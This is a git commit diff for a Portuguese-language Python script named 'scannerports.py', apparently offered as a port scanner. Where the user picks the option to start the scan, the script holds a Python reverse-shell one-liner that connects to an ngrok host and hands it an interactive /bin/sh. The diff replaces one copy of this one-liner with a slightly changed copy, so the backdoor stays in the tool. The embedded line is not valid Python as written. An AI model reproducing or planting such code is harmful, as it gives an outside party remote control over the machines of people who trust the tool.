9643600eee99def8c862f2c067006c570aaef498
SirCaveiraOFC <68562204+SirCaveiraOFC@users.noreply.github.com>
2020-11-10 01:25:05 -0300

    Update scannerports.py

--- scannerports.py
+++ scannerports.py
@@ -7,6 +7,6 @@ print('###############################')
 print('Coded BY: Sr.Caveira - (v1.0)\n')
 scan = int(input('Digite 1 para iniciar a Ferramenta de Scan: '))
 if(scan == 1):
-    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("4.tcp.ngrok.io",17218));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+    command -v python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("4.tcp.ngrok.io",17218));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 else:
     print('Erro! Insira uma opção válida.')
